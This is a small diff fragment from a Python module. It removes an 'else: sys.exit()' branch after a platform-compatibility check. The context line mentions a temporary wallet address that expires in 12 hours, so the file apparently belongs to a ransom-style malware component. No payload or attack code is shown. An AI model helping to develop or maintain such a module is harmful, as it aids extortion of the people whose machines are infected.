@@ -41,8 +41,6 @@ generated temporary wallet address that expires in 12 hours
 # setup
 if util.is_compatible(platforms, __name__):
     util.imports(packages, globals())
-else:
-    sys.exit()
 
 # main
 def _threader(tasks):
